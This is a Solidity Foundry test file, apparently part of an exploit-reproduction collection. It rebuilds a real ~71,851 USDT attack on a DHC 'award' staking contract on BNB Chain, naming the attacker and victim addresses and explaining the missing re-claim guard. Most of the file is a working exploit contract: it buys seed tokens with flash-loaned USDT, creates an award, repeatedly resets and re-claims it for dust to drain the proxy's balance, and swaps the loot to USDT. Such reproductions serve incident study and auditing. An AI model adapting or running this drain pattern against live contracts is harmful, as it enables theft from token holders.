// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.15;

import "forge-std/Test.sol";

// DHC (DeHealth / RedSonic-style "Award" staking) — award re-claim (share-price / reward double
// spend) — BNB Chain. Attacker net gain ~71,851 USDT.
//
// Attacker EOA   : 0xD3A8D0A9F55cf679fff6F277E49AfC95B49D2B07
// Exploit contract (on-chain): 0x226923D34A10f3D54B57b9F4b685E82c6Cba968A
// Victim proxy   : 0xe2a047aaDbac51b0116Af1cE91EbdAe4b4202094 (TransparentUpgradeableProxy)
// Vulnerable impl: 0x5abb3fe2a02e5d4320862944cd3a0b8f6af28ce1 (award logic; UNVERIFIED on BscScan)
// DHC token      : 0x743F15f4d2481774d970f286f0EbAD9C3Daed6E9 (reflection token, proxy)
// USDT           : 0x55d398326f99059fF775485246999027B3197955
//
// On-chain the attack was 4 transactions in one block (120055460): a contract-creation (the
// exploit contract) and three calls into it — 0xc0406226, 0x9890220b, 0x84054d3d. This PoC keeps
// that 4-step shape (deploy in setUp, then prime()/pledge()/cashout()) but reconstructs each step
// as ordinary Solidity calling the victim's real functions, instead of replaying the attacker's
// creation bytecode as an opaque blob poked with bare selectors.
//
// Root cause (confirmed empirically against the exploit trace, block 120055460):
//   The award state machine has no re-claim guard. createAward() records a fixed reward with no
//   per-award reserve or locked collateral. participateAward() does not require the award to still
//   be unclaimed, so a claimed award (status 2) can be reset back to status 1 by anyone owning the
//   position, for as little as 0-1 wei. claimAward() then pays the same fixed reward again out of
//   the shared proxy DHC balance. In the trace the caller is the attacker's contract, not the proxy
//   owner (0x007FA7F9...), so it is permissionless. Repeating participate-reset + claim drains the
//   proxy's entire DHC balance one fixed reward at a time.
//
// Attack flow, reconstructed below:
//   1. (prime) Take a USDT flash loan (on-chain: DODO), buy DHC on PancakeSwap for seed, register
//      an inviter (the award system rejects participants with no inviter), then createAward with a
//      fixed reward.
//   2. (pledge) participateAward once with the full pledge, then claimAward once (status -> 2).
//   3. (cashout) Loop { participateAward(id, tiny) to reset status 2 -> 1 ; claimAward(id) } until
//      the proxy's DHC is drained, then dump the drained DHC to USDT on PancakeSwap, repay the
//      flash-loan principal, and keep the surplus.
//
// NOTE on victim function names: the award-logic implementation (0x5abb3fe2...) is not verified on
// BscScan and none of the four award selectors observed in the trace resolve in the 4byte
// directory. They are therefore called here as raw selector calls (visible selector + explicit
// arguments, not an opaque pre-encoded calldata blob). The behaviour attached to each selector is
// inferred from the on-chain trace (argument layout, token movements, status transitions), and the
// helper names below (createAward / getAward / participateAward / claimAward) describe that observed
// behaviour rather than a verified source name:
//   0x7f200fee  createAward(uint256 reward)          -> records a fixed reward
//   0x9ba6df97  getAward()                            -> returns the current award tuple; id is the last word
//   0xe3db9b54  participateAward(uint256 id, uint256) -> (re)enters the award; resets a claimed award to claimable
//   0x43609f36  claimAward(uint256 id)                -> pays the fixed reward from the shared proxy balance
// setInviter/getInviter (on the DHC token) and the PancakeSwap router functions are standard and
// resolve normally.
//
// The USDT flash loan itself is not the vulnerability; it is modelled here with a dealt USDT balance
// (the seed principal, repaid out of proceeds) rather than wiring the DODO callback, for clarity.
//
// Run:
//   forge test --contracts src/test/2026-09/DHC_exp.sol -vvv

interface IERC20 {
    function balanceOf(address) external view returns (uint256);
    function approve(address, uint256) external returns (bool);
    function transfer(address, uint256) external returns (bool);
}

interface IDHC {
    // DHC token referral registry. setInviter requires the given inviter to already be registered,
    // which is why the on-chain attack chained helper positions off an existing registered address.
    function setInviter(address inviter) external;
    function getInviter(address user) external view returns (address);
}

interface IPancakeRouter {
    function swapExactTokensForTokensSupportingFeeOnTransferTokens(
        uint256 amountIn,
        uint256 amountOutMin,
        address[] calldata path,
        address to,
        uint256 deadline
    ) external;
}

contract DHC_exp is Test {
    address internal constant ATTACKER = 0xD3A8D0A9F55cf679fff6F277E49AfC95B49D2B07;
    address internal constant PROXY = 0xe2A047aADbac51b0116Af1cE91eBDAe4B4202094;
    address internal constant IMPL = 0x5ABB3fe2A02E5D4320862944cd3a0B8f6Af28CE1;
    address internal constant DHC = 0x743F15f4d2481774d970f286f0EbAD9C3Daed6E9;
    address internal constant USDT = 0x55d398326f99059fF775485246999027B3197955;

    uint256 internal constant SEED_USDT = 10_000 ether; // on-chain: DODO USDT flash loan principal

    DHCExploit internal exploit;

    function setUp() public {
        // Parent block of the exploit tx: real protocol state immediately before the attack.
        vm.createSelectFork("http://127.0.0.1:8546", 120055459);
        exploit = new DHCExploit(ATTACKER);

        // Model the DODO USDT flash loan: fund the exploit with the principal it repays at the end.
        deal(USDT, address(exploit), SEED_USDT);

        vm.label(ATTACKER, "Attacker");
        vm.label(address(exploit), "Exploit");
        vm.label(PROXY, "DHC_Vault_Proxy");
        vm.label(IMPL, "DHC_Award_Impl");
        vm.label(DHC, "DHC");
        vm.label(USDT, "USDT");
    }

    function testExploit() public {
        uint256 before = IERC20(USDT).balanceOf(ATTACKER);
        emit log_named_decimal_uint("attacker USDT before", before, 18);

        // The 4-step, one-block structure: deploy (setUp) then three calls, all as the attacker.
        vm.startPrank(ATTACKER, ATTACKER);
        exploit.prime(SEED_USDT); // 0xc0406226 on-chain
        exploit.pledge(); // 0x9890220b on-chain
        exploit.cashout(SEED_USDT); // 0x84054d3d on-chain
        vm.stopPrank();

        uint256 profit = IERC20(USDT).balanceOf(ATTACKER) - before;
        emit log_named_decimal_uint("attacker USDT after", IERC20(USDT).balanceOf(ATTACKER), 18);
        emit log_named_decimal_uint("attacker net profit (USDT)", profit, 18);

        // On-chain the attacker EOA received 71,851.0167 USDT. This reconstruction reproduces the
        // loss to within ~1% (single-pair dump vs the original's multi-venue dump, and the inviter
        // cut on the first pledge), so it is asserted with a small band rather than to the wei.
        assertGe(profit, 70_000 ether, "profit below expected ~71,851 USDT");
        assertApproxEqAbs(profit, 71_851 ether, 2_000 ether, "profit off reconstructed ~71,851 USDT");
    }
}

contract DHCExploit {
    address internal constant PROXY = 0xe2A047aADbac51b0116Af1cE91eBDAe4B4202094;
    address internal constant DHC = 0x743F15f4d2481774d970f286f0EbAD9C3Daed6E9;
    address internal constant USDT = 0x55d398326f99059fF775485246999027B3197955;
    address internal constant ROUTER = 0x10ED43C718714eb63d5aA57B78B54704E256024E; // PancakeSwap V2 router
    // An already-registered DHC referral account; used as this contract's inviter so participateAward
    // can pay its inviter cut (it reverts on a zero inviter). On-chain the attacker chained its own
    // helper positions off this same root address.
    address internal constant ROOT_INVITER = 0xe099bC70737158FD580Be8BD082faCaB3eCfFA60;

    // Award-logic selectors on the (unverified) implementation. See the NOTE in the file header.
    bytes4 internal constant SEL_CREATE_AWARD = 0x7f200fee;
    bytes4 internal constant SEL_GET_AWARD = 0x9ba6df97;
    bytes4 internal constant SEL_PARTICIPATE = 0xe3db9b54;
    bytes4 internal constant SEL_CLAIM = 0x43609f36;

    // Fixed reward the award is created with (matches the on-chain attack): 14016.519... DHC. The
    // reward paid out per claim is a fixed fraction of this, taken from the shared proxy balance.
    uint256 internal constant REWARD = 0x2f7d64a231c0d4801fe;
    uint256 internal constant RESET_AMOUNT = 2; // dust re-pledge that flips a claimed award back to claimable

    address internal immutable owner;
    uint256 internal awardId;

    constructor(address owner_) {
        owner = owner_;
    }

    // Step 1 (0xc0406226): flash-loan-funded seed buy, inviter registration, and award creation.
    function prime(uint256 seedUsdt) external {
        require(msg.sender == owner, "not owner");

        // Buy DHC seed with the flash-loaned USDT.
        _swap(USDT, DHC, seedUsdt);

        // Register an inviter so the award system will accept this contract as a participant.
        IDHC(DHC).setInviter(ROOT_INVITER);

        // Approve DHC for the award vault and create the award with a fixed reward.
        IERC20(DHC).approve(PROXY, type(uint256).max);
        _award(abi.encodeWithSelector(SEL_CREATE_AWARD, REWARD), "createAward");

        // Read back the created award; its id is the last word of the returned tuple.
        bytes memory ret = _award(abi.encodeWithSelector(SEL_GET_AWARD), "getAward");
        uint256 id;
        assembly {
            id := mload(add(ret, mload(ret)))
        }
        awardId = id;
    }

    // Step 2 (0x9890220b): the initial full pledge and first claim.
    function pledge() external {
        require(msg.sender == owner, "not owner");
        _participate(REWARD);
        _claim();
    }

    // Step 3 (0x84054d3d): drain the proxy by re-claiming the same award, then dump to USDT.
    function cashout(uint256 seedUsdt) external {
        require(msg.sender == owner, "not owner");

        // Re-claim loop: reset the claimed award to claimable for dust, then claim the fixed reward
        // again, until the shared proxy balance can no longer cover a reward.
        for (uint256 i = 0; i < 600; i++) {
            if (IERC20(DHC).balanceOf(PROXY) < 1401 ether) break;
            _participate(RESET_AMOUNT);
            _claim();
        }

        // Dump all drained DHC for USDT.
        _swap(DHC, USDT, IERC20(DHC).balanceOf(address(this)));

        // Repay the flash-loan principal (retained in this contract), send the surplus to the EOA.
        uint256 bal = IERC20(USDT).balanceOf(address(this));
        require(bal > seedUsdt, "no profit");
        IERC20(USDT).transfer(owner, bal - seedUsdt);
    }

    function _participate(uint256 amount) internal {
        _award(abi.encodeWithSelector(SEL_PARTICIPATE, awardId, amount), "participateAward");
    }

    function _claim() internal {
        _award(abi.encodeWithSelector(SEL_CLAIM, awardId), "claimAward");
    }

    function _award(bytes memory data, string memory what) internal returns (bytes memory) {
        (bool ok, bytes memory ret) = PROXY.call(data);
        require(ok, what);
        return ret;
    }

    function _swap(address tokenIn, address tokenOut, uint256 amountIn) internal {
        IERC20(tokenIn).approve(ROUTER, amountIn);
        address[] memory path = new address[](2);
        path[0] = tokenIn;
        path[1] = tokenOut;
        IPancakeRouter(ROUTER).swapExactTokensForTokensSupportingFeeOnTransferTokens(
            amountIn, 0, path, address(this), block.timestamp
        );
    }
}
